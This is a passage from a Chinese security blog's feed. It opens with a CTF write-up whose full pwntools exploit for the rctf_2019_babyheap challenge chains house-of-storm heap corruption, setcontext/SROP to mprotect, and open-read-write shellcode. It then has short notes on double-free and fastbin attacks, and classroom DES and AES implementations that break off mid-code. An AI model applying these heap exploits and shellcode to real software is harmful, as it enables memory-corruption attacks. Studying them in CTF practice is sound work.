p64(fake_chunk)edit(11, payload)#dbg()payload = '\x00'*0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) +p64(0) + p64(fake_chunk-0x18-5)edit(12, payload)#dbg()add(0x48)#6</code></pre><h3 id="mprotect-shellcode"><a href="#mprotect-shellcode" class="headerlink" title="mprotect+shellcode"></a>mprotect+shellcode</h3><p>修改free_hook为set_context+53，free_hook+0x18，free_hook+0x18，shellcode1,<br>setcontext函数负责对各个寄存器进行赋值，甚至可以控制rip，对寄存器进行赋值主要从+53开始，shellcode1即为read(0, new_addr,0x1000)，new_addr即为（free_hook &amp;0xFFFFFFFFFFFFF000）free_hook所在内存页的起始位置。我们将对这里赋予可读可写可执行权限。</p><pre><code>new_addr =  free_hook &amp;0xFFFFFFFFFFFFF000shellcode1 = '''xor rdi,rdimov rsi,%dmov edx,0x1000mov eax,0syscalljmp rsi''' % new_addredit(6, 'a'*0x10+p64(set_context+53)+p64(free_hook+0x18)*2+asm(shellcode1))</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/61bf594dbee4483f94beaf7afa376c9d.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/61bf594dbee4483f94beaf7afa376c9d.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p><p>修改前<br class='item-img' data-src='https://img-blog.csdnimg.cn/59681f7ab0f64f57a185cacaffcb4ca2.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/59681f7ab0f64f57a185cacaffcb4ca2.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br>修改后<br class='item-img' data-src='https://img-blog.csdnimg.cn/6bbe06a1c4ab4168a5bcf210118afc78.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/6bbe06a1c4ab4168a5bcf210118afc78.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p><h3 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h3><p>我们利用pwntools里的SigreturnFrame()执行mprotect(new_addr,0x1000,7)，并将rsp跳转到<br>free_hook+0x10处，即0x00007f05935487c0，之后执行0x00007f05935487c0地址处的代码，即我们刚才写入的shellcode1，执行read(0, new_addr,0x1000)，将我们构造的第二个shellcode写入0x00007f0593548000处 ，并将rip跳转到我们写的第二个shellcode处执行。</p><pre><code>frame = SigreturnFrame()frame.rsp = free_hook+0x10frame.rdi = new_addrframe.rsi = 0x1000frame.rdx = 7frame.rip = libc.sym['mprotect']edit(12, str(frame))free(12)</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/0211f5b1b2cb415b910461947216e62e.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/0211f5b1b2cb415b910461947216e62e.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/96861fc257104349a4a906803ad96103.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/96861fc257104349a4a906803ad96103.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p><h3 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h3><p>利用orw构造shellcode，发送过去并执行，获得shell</p><pre><code>shellcode2 = '''mov rax, 0x67616c662f ;// /flagpush raxmov rdi, rsp ;// /flagmov rsi, 0 ;// O_RDONLYxor rdx, rdx ;mov rax, 2 ;// SYS_opensyscallmov rdi, rax ;// fd mov rsi,rsp  ;mov rdx, 1024 ;// nbytesmov rax,0 ;// SYS_readsyscallmov rdi, 1 ;// fd mov rsi, rsp ;// bufmov rdx, rax ;// count mov rax, 1 ;// SYS_writesyscallmov rdi, 0 ;// error_codemov rax, 60syscall'''sl(asm(shellcode2))itr()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/7f499b7e484a41cf8d8efde596b692d9.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/7f499b7e484a41cf8d8efde596b692d9.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code># coding=utf-8from pwn import *#sh = remote("node4.buuoj.cn", 29278)sh = process('./rctf_2019_babyheap')context(log_level = 'debug', arch = 'amd64', os = 'linux')elf = ELF("./rctf_2019_babyheap")libc = ELF('../../libc-2.23.so--64')def dbg():        gdb.attach(sh)        pause()#命令简写化s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims   :sh.recvuntil(delims)itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\0'))uu64    = lambda data               :u64(data.ljust(8,'\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg=lambda address,data:log.success('%s: '%(address)+hex(data)) def add(size):    ru("Choice: \n")    sl('1')    ru("Size: ")    sl(str(size))def free(index):    ru("Choice: \n")    sl('3')    ru("Index: ")    sl(str(index))def show(index):    ru("Choice: \n")    sl('4')    ru("Index: ")    sl(str(index))def edit(index, content):    ru("Choice: \n")    sl('2')    ru("Index: ")    sl(str(index))    ru("Content: ")    s(content)def pwn():     add(0x80)#0    add(0x68)#1    add(0xf0)#2    add(0x18)#3        #dbg()    free(0)    payload = 'a'*0x60 + p64(0x100)    edit(1, payload)        #dbg()        free(2)    #dbg()    add(0x80)#0    show(1)    malloc_hook = u64(ru('\x7f').ljust(8, '\x00')) - 0x58 - 0x10    libc.address = malloc_hook - libc.sym['__malloc_hook']    system = libc.sym['system']    free_hook = libc.sym['__free_hook']    set_context = libc.symbols['setcontext']    lg('libc_base',libc.address)        #dbg()        add(0x160)#2    #dbg()    #---------------布置chunk-------------------------#    add(0x18)#4    add(0x508)#5    add(0x18)#6    add(0x18)#7    add(0x508)#8    add(0x18)#9    add(0x18)#10    #dbg()    #----------------准备 unsorted chunk-----------------------#    edit(5, 'a'*0x4f0+p64(0x500))    #dbg()    free(5)    edit(4, 'a'*0x18)        #dbg()    add(0x18)#5    add(0x4d8)#11    free(5)    free(6)        #dbg()        add(0x30)#5    add(0x4e8)#6        #dbg()        #-------------------准备 large chunk-----------------------------------#    edit(8, 'a'*0x4f0+p64(0x500))    free(8)    edit(7, 'a'*0x18)    add(0x18)#8    add(0x4d8)#12    free(8)    free(9)    add(0x40)#8    #---------------unsorted chunk 和 large chunk 放到对应位置----------------------#        #dbg()        free(6)        #dbg()        add(0x4e8)#6        #dbg()        free(6)    #dbg()    #pause()    #--------------修改他们的满足条件进行 house of strom------------------------------#    storage = free_hook    fake_chunk = storage - 0x20    payload = '\x00'*0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk)    edit(11, payload)    #dbg()    payload = '\x00'*0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) +p64(0) + p64(fake_chunk-0x18-5)    edit(12, payload)    #dbg()    add(0x48)#6        #dbg()    new_addr =  free_hook &amp;0xFFFFFFFFFFFFF000    shellcode1 = '''    xor rdi,rdi    mov rsi,%d    mov edx,0x1000    mov eax,0    syscall    jmp rsi    ''' % new_addr    edit(6, 'a'*0x10+p64(set_context+53)+p64(free_hook+0x18)*2+asm(shellcode1))    #dbg()    frame = SigreturnFrame()    frame.rsp = free_hook+0x10    frame.rdi = new_addr    frame.rsi = 0x1000    frame.rdx = 7    frame.rip = libc.sym['mprotect']    edit(12, str(frame))    free(12)    #dbg()     shellcode2 = '''    mov rax, 0x67616c662f ;// /flag    push rax    mov rdi, rsp ;// /flag    mov rsi, 0 ;// O_RDONLY    xor rdx, rdx ;    mov rax, 2 ;// SYS_open    syscall    mov rdi, rax ;// fd     mov rsi,rsp  ;    mov rdx, 1024 ;// nbytes    mov rax,0 ;// SYS_read    syscall    mov rdi, 1 ;// fd     mov rsi, rsp ;// buf    mov rdx, rax ;// count     mov rax, 1 ;// SYS_write    syscall    mov rdi, 0 ;// error_code    mov rax, 60    syscall    '''    sl(asm(shellcode2))        dbg()    itr()  pwn()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;同样是house of storm，但是如果程序开启了沙箱，禁用了system函数，那我们常规把hook函数改为system函数的方法就失效了，&lt;br&gt;若是沙箱没有禁用open，read，write函数，这里我们可以考虑用orw。&lt;/strong&gt;&lt;/p&gt;
</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="House of 系列" scheme="https://kylinxin.github.io/tags/House-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>doublefree</title>
    <link href="https://kylinxin.github.io/2023/04/10/double%20free/"/>
    <id>https://kylinxin.github.io/2023/04/10/double%20free/</id>
    <published>2023-04-10T15:14:29.000Z</published>
    <updated>2023-09-12T09:16:05.295Z</updated>
    
    <content type="html"><![CDATA[<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><blockquote><p>1.fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空<br>2.fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</p></blockquote><p>该漏洞是指将同一个chunk free两次，通常情况下free两个chunk会报错是无法编译的，监测机制也很简单，就仅仅是对free变量与前一个进行对比，所以可以中间夹一个其他的实现：</p><pre><code>free(shangu1)free(shangu2)free(shangu1)</code></pre><p>此时的 bins 中情况大概如下：0x20 —&gt; shangu1 —&gt; shangu2 —&gt; shangu1<br>当再次申请堆时会出现 有两个指针指向同一个chunk</p><p>![联想截图_20230322221849.png](<a href="https://s2.loli.net/2023/09/12/BI6lRtbdPnKTuMN.png">https://s2.loli.net/2023/09/12/BI6lRtbdPnKTuMN.png</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;利用条件&quot;&gt;&lt;a href=&quot;#利用条件&quot; class=&quot;headerlink&quot; title=&quot;利用条件&quot;&gt;&lt;/a&gt;利用条件&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;1.fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空&lt;b</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="fastbin attack" scheme="https://kylinxin.github.io/tags/fastbin-attack/"/>
    
  </entry>
  
  <entry>
    <title>fastbin attack</title>
    <link href="https://kylinxin.github.io/2023/04/10/fastbin%20attack/"/>
    <id>https://kylinxin.github.io/2023/04/10/fastbin%20attack/</id>
    <published>2023-04-10T15:14:29.000Z</published>
    <updated>2023-09-12T09:16:16.167Z</updated>
    
    <content type="html"><![CDATA[<p>如果从fastbins中malloc-一个freechunk时，glibc会做以下两个检测：</p><pre><code>检测1：检测你要malloc的freechunk的大小是否在该chunk所在的fastbin链的大小尺寸范围内（例如：一个fastbin链所存储的chunk大小必须在0x30-0x40之间，但是你要申请的这个chunk却是0x50,那么就会程序就报错退出)检测2：检测你这个freechunk的size成员的PREV INUSE为是否为1，为1才可以通过检测</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;如果从fastbins中malloc-一个freechunk时，glibc会做以下两个检测：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;检测1：检测你要malloc的freechunk的大小是否在该chunk所在的fastbin链的大小尺寸范围内（例如：一个fastbin链所存储的
c</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="fastbin attack" scheme="https://kylinxin.github.io/tags/fastbin-attack/"/>
    
  </entry>
  
  <entry>
    <title>密码学实验</title>
    <link href="https://kylinxin.github.io/2023/04/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C/"/>
    <id>https://kylinxin.github.io/2023/04/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C/</id>
    <published>2023-04-10T15:14:29.000Z</published>
    <updated>2023-05-05T12:10:42.242Z</updated>
    
    <content type="html"><![CDATA[<h2 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h2><pre class=" language-C++"><code class="language-C++">#include <bits/stdc++.h>using namespace std;string string_to_hex(const string& str) //字符串转化为十六进制{    string result="";    string tmp;    stringstream ss;    for(int i=0;i<str.size();i++)    {        ss<<hex<<int(str[i])<<endl;        ss>>tmp;        result+=tmp;    }    return result;}string hex_to_string(const std::string& str){    std::string result;    for (size_t i = 0; i < str.length(); i += 2)//十六进制两个字符为原始字符一个字符    {        std::string byte = str.substr(i, 2);//每次切两个字符        //将十六进制的string转成long再强转成int再转成char        char chr = (char)(int)strtol(byte.c_str(), NULL, 16);        result.push_back(chr);//将处理完的字符压入result中    }    return result;}string hex2bin(string s){    //十六进制转化为二进制    unordered_map<char, string> mp;    mp['0'] = "0000";    mp['1'] = "0001";    mp['2'] = "0010";    mp['3'] = "0011";    mp['4'] = "0100";    mp['5'] = "0101";    mp['6'] = "0110";    mp['7'] = "0111";    mp['8'] = "1000";    mp['9'] = "1001";    mp['A'] = "1010";    mp['B'] = "1011";    mp['C'] = "1100";    mp['D'] = "1101";    mp['E'] = "1110";    mp['F'] = "1111";    string bin = "";    for (int i = 0; i < s.size(); i++) {        bin += mp[s[i]];    }    return bin;}string bin2hex(string s){    // 二进制转化为16进制    unordered_map<string, string> mp;    mp["0000"] = "0";    mp["0001"] = "1";    mp["0010"] = "2";    mp["0011"] = "3";    mp["0100"] = "4";    mp["0101"] = "5";    mp["0110"] = "6";    mp["0111"] = "7";    mp["1000"] = "8";    mp["1001"] = "9";    mp["1010"] = "A";    mp["1011"] = "B";    mp["1100"] = "C";    mp["1101"] = "D";    mp["1110"] = "E";    mp["1111"] = "F";    string hex = "";    for (int i = 0; i < s.length(); i += 4) {        string ch = "";        ch += s[i];        ch += s[i + 1];        ch += s[i + 2];        ch += s[i + 3];        hex += mp[ch];    }    return hex;}string permute(string k, int* arr, int n){    string per = "";    for (int i = 0; i < n; i++) {        per += k[arr[i] - 1];    }    return per;}string shift_left(string k, int shifts){    string s = "";    for (int i = 0; i < shifts; i++) {        for (int j = 1; j < 28; j++) {            s += k[j];        }        s += k[0];        k = s;        s = "";    }    return k;}string xor_(string a, string b){    string ans = "";    for (int i = 0; i < a.size(); i++) {        if (a[i] == b[i]) {            ans += "0";        }        else {            ans += "1";        }    }    return ans;}string encrypt(string pt, vector<string> rkb,               vector<string> rk){    // 16->2    pt = hex2bin(pt);    // 初始置换    int initial_perm[64]            = { 58, 50, 42, 34, 26, 18, 10, 2,  60, 52, 44,                36, 28, 20, 12, 4,  62, 54, 46, 38, 30, 22,                14, 6,  64, 56, 48, 40, 32, 24, 16, 8,  57,                49, 41, 33, 25, 17, 9,  1,  59, 51, 43, 35,                27, 19, 11, 3,  61, 53, 45, 37, 29, 21, 13,                5,  63, 55, 47, 39, 31, 23, 15, 7 };    // 初始置换    pt = permute(pt, initial_perm, 64);    cout << "初始置换后: " << bin2hex(pt)         << endl;    // 拆分成左右32比特    string left = pt.substr(0, 32);    string right = pt.substr(32, 32);    cout << "拆分后: L0=" << bin2hex(left)         << " R0=" << bin2hex(right) << endl;    // E盒扩展    int exp_d[48]            = { 32, 1,  2,  3,  4,  5,  4,  5,  6,  7,  8,  9,                8,  9,  10, 11, 12, 13, 12, 13, 14, 15, 16, 17,                16, 17, 18, 19, 20, 21, 20, 21, 22, 23, 24, 25,                24, 25, 26, 27, 28, 29, 28, 29, 30, 31, 32, 1 };    // S盒    int s[8][4][16] = {            { 14, 4,  13, 1, 2,  15, 11, 8,  3,  10, 6,  12, 5,9,  0,  7,  0, 15, 7,  4,  14, 2,  13, 1,  10, 6,12, 11, 9,  5, 3,  8,  4,  1,  14, 8,  13, 6,  2, 11, 15, 12, 9, 7,  3,  10, 5,  0,  15, 12, 8,  2, 4,  9,  1,  7, 5,  11, 3,  14, 10, 0,  6,  13 },            { 15, 1,  8,  14, 6,  11, 3, 4,  9,  7,  2,  13, 12, 0,  5,  10, 3,  13, 4,  7, 15, 2,  8,  14, 12, 0, 1,  10, 6,  9,  11, 5,  0, 14, 7,  11, 10, 4,  13, 1,  5,  8,  12, 6,  9,  3, 2,  15, 13, 8,  10, 1, 3,  15, 4,  2,  11, 6,  7, 12, 0,  5,  14, 9 },            { 10, 0,  9,  14, 6,  3,  15, 5,  1,  13, 12, 7,  11, 4,  2,  8,  13, 7,  0,  9,  3,  4, 6,  10, 2,  8,  5,  14, 12, 11, 15, 1,  13, 6,  4,  9,  8,  15, 3,  0,  11, 1,  2,  12, 5,  10, 14, 7,  1,  10, 13, 0,  6,  9,  8, 7,  4,  15, 14, 3,  11, 5,  2,  12 },            { 7,  13, 14, 3,  0,  6,  9,  10, 1,  2, 8,  5,  11, 12, 4,  15, 13, 8,  11, 5,  6,  15, 0, 3,  4,  7, 2,  12, 1,  10, 14, 9,  10, 6,  9,  0, 12, 11, 7, 13, 15, 1,  3,  14, 5,  2,  8,  4,  3, 15, 0,  6, 10, 1,  13, 8,  9,  4,  5,  11, 12, 7, 2,  14 },            { 2,  12, 4, 1,  7,  10, 11, 6, 8,  5,  3,  15, 13, 0,  14, 9, 14, 11, 2,  12, 4, 7,  13, 1,  5,  0, 15, 10, 3, 9,  8,  6,  4,  2, 1,  11, 10, 13, 7, 8,  15, 9, 12, 5,  6,  3,  0, 14, 11, 8,  12, 7, 1,  14, 2, 13, 6,  15, 0,  9, 10, 4,  5,  3 },            { 12, 1,  10, 15, 9,  2,  6,  8,  0,  13, 3, 4, 14, 7,  5,  11, 10, 15, 4,  2,  7,  12, 9,  5, 6, 1, 13, 14, 0,  11, 3,  8,  9,  14, 15, 5,  2, 8, 12, 3,  7,  0,  4,  10, 1,  13, 11, 6,  4,  3, 2, 12, 9,  5,  15, 10, 11, 14, 1,  7,  6,  0,  8, 13 },            { 4,  11, 2,  14, 15, 0,  8, 13, 3,  12, 9,  7,  5,  10, 6,  1,  13, 0,  11, 7, 4,  9,  1,  10, 14, 3, 5,  12, 2,  15, 8,  6,  1, 4,  11, 13, 12, 3,  7, 14, 10, 15, 6,  8,  0,  5, 9,  2,  6,  11, 13, 8, 1,  4,  10, 7,  9,  5,  0, 15, 14, 2,  3,  12 },            { 13, 2,  8, 4,  6,  15, 11, 1,  10, 9, 3, 14, 5, 0,  12, 7, 1,  15, 13, 8,  10, 3,  7, 4, 12, 5, 6,  11, 0, 14, 9,  2,  7,  11, 4,  1, 9, 12, 14, 2,  0,  6, 10, 13, 15, 3,  5,  8,  2, 1, 14, 7, 4,  10, 8, 13, 15, 12, 9,  0,  3,  5, 6, 11 }    };    // P盒置换    int per[32]            = { 16, 7, 20, 21, 29, 12, 28, 17, 1,  15, 23,                26, 5, 18, 31, 10, 2,  8,  24, 14, 32, 27,                3,  9, 19, 13, 30, 6,  22, 11, 4,  25 };    cout << endl;    for (int i = 0; i < 16; i++) {        string right_expanded = permute(right, exp_d, 48);        string x = xor_(rkb[i], right_expanded);        // S        string op = "";        for (int i = 0; i < 8; i++) {            int row = 2 * int(x[i * 6] - '0')                      + int(x[i * 6 + 5] - '0');            int col = 8 * int(x[i * 6 + 1] - '0')                      + 4 * int(x[i * 6 + 2] - '0')                      + 2 * int(x[i * 6 + 3] - '0')                      + int(x[i * 6 + 4] - '0');            int val = s[i][row][col];            op += char(val / 8 + '0');            val = val % 8;            op += char(val / 4 + '0');            val = val % 4;            op += char(val / 2 + '0');            val = val % 2;            op += char(val + '0');        }        op = permute(op, per, 32);        x = xor_(op, left);        left = x;        // 交换左右        if (i != 15) {            swap(left, right);        }        cout << "轮数: " << i + 1 << " " << bin2hex(left)             << " " << bin2hex(right) << " " << rk[i]             << endl;    }    // 左右结合    string combine = left + right;    // IP逆置换    int final_perm[64]            = { 40, 8,  48, 16, 56, 24, 64, 32, 39, 7,  47,                15, 55, 23, 63, 31, 38, 6,  46, 14, 54, 22,                62, 30, 37, 5,  45, 13, 53, 21, 61, 29, 36,                4,  44, 12, 52, 20, 60, 28, 35, 3,  43, 11,                51, 19, 59, 27, 34, 2,  42, 10, 50, 18, 58,                26, 33, 1,  41, 9,  49, 17, 57, 25 };    string cipher = bin2hex(permute(combine, final_perm, 64));    return cipher;}int main(){    string pt, key;    cout<<"请输入明文: ";    cin>>pt;    cout<<"请输入密文: ";    cin>>key;    pt = string_to_hex(pt);    cout<<pt;    key = string_to_hex(key);    key = hex2bin(key);    int keyp[56]            = { 57, 49, 41, 33, 25, 17, 9,  1,  58, 50, 42, 34,                26, 18, 10, 2,  59, 51, 43, 35, 27, 19, 11, 3,                60, 52, 44, 36, 63, 55, 47, 39, 31, 23, 15, 7,                62, 54, 46, 38, 30, 22, 14, 6,  61, 53, 45, 37,                29, 21, 13, 5,  28, 20, 12, 4 };    //密钥生成    key = permute(key, keyp, 56);    int shift_table[16] = { 1, 1, 2, 2, 2, 2, 2, 2,                            1, 2, 2, 2, 2, 2, 2, 1 };    int key_comp[48] = { 14, 17, 11, 24, 1,  5,  3,  28,                         15, 6,  21, 10, 23, 19, 12, 4,                         26, 8,  16, 7,  27, 20, 13, 2,                         41, 52, 31, 37, 47, 55, 30, 40,                         51, 45, 33, 48, 44, 49, 39, 56,                         34, 53, 46, 42, 50, 36, 29, 32 };    string left = key.substr(0, 28);    string right = key.substr(28, 28);    vector<string> rkb;    vector<string> rk;    for (int i = 0; i < 16; i++) {        left = shift_left(left, shift_table[i]);        right = shift_left(right, shift_table[i]);        string combine = left + right;        string RoundKey = permute(combine, key_comp, 48);        rkb.push_back(RoundKey);        rk.push_back(bin2hex(RoundKey));    }    cout << "加密:\n";    string cipher = encrypt(pt, rkb, rk);    cout << "密文: " << cipher << endl;    cout << "解密:\n";    reverse(rkb.begin(), rkb.end());    reverse(rk.begin(), rk.end());    string text = encrypt(cipher, rkb, rk);    text = hex_to_string(text);    cout << "明文: " << text << endl;}</code></pre><h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><pre class=" language-c++"><code class="language-c++">#include <iostream>#include <bits/stdc++.h>#include <stdint.h>#include<iomanip>void AddRoundKey(uint8_t mtx[],uint32_t w[]);uint32_t SubKeys(uint32_t temp);void SubBytes(uint8_t mtx[],int len);void KeyExpansion(uint8_t key[], uint32_t new_key[]);void Display(uint8_t Matrix[]);void DisplayKeys(uint8_t Matrix[][16]);uint32_t left_bit_move(uint32_t val, int n);using namespace std;uint32_t T[4][256];//存储4张列混淆表int mixCol[4][4] = {        {0x02, 0x03, 0x01, 0x01},        {0x01, 0x02, 0x03, 0x01},        {0x01, 0x01, 0x02, 0x03},        {0x03, 0x01, 0x01, 0x02}};//列混淆矩阵uint8_t S_Box[16][16] =        {                {0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76},                {0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0},                {0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15},                {0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75},                {0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84},                {0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF},                {0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8},                {0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2},                {0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73},                {0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB},                {0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79},                {0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08},                {0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A},                {0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E},                {0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF},                {0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16}        };//逆S盒uint8_t Inv_S_Box[16][16] =        {                {0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB},                {0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB},                {0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E},                {0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25},                {0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92},                {0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84},                {0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06},                {0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B},                {0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73},                {0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E},                {0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B},                {0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4},                {0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F},                {0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF},                {0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61},                {0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D}        };//轮密钥加uint32_t LunMiYaoJia[10] = {0x01000000, 0x02000000, 0x04000000, 0x08000000, 0x10000000,                            0x20000000, 0x40000000, 0x80000000, 0x1b000000, 0x36000000};uint32_t left_bit_move(uint32_t val, int n) {    uint32_t size = sizeof(val) * 8;    n = n % size;    return (val >> (size - n) | (val << n));//左移    //return (val << (size - n) | (val >> n));//右移}string string_to_hex(const string& str) //字符串转化为十六进制{    string result="";    string tmp;    stringstream ss;    for(int i=0;i<str.size();i++)    {        ss<<hex<<int(str[i])<<endl;        ss>>tmp;        result+=tmp;    }    return result;}string hex_to_string(const std::string& str){    std::string result;    for (size_t i = 0; i < str.length(); i += 2)//十六进制两个字符为原始字符一个字符    {        std::string byte = str.substr(i, 2);//每次切两个字符        //将十六进制的string转成long再强转成int再转成char        char chr = (char)(int)strtol(byte.c_str(), NULL, 16);        result.push_back(chr);//将处理完的字符压入result中    }    return result;}//制作列混淆表uint8_t Mul_02(uint8_t x){    if((x>>7) == 0)        return x<<1;    else        return ((x<<1)^0x1b)&0xff;}uint32_t get_output_col1(uint8_t x){    x = (uint32_t)x;    return 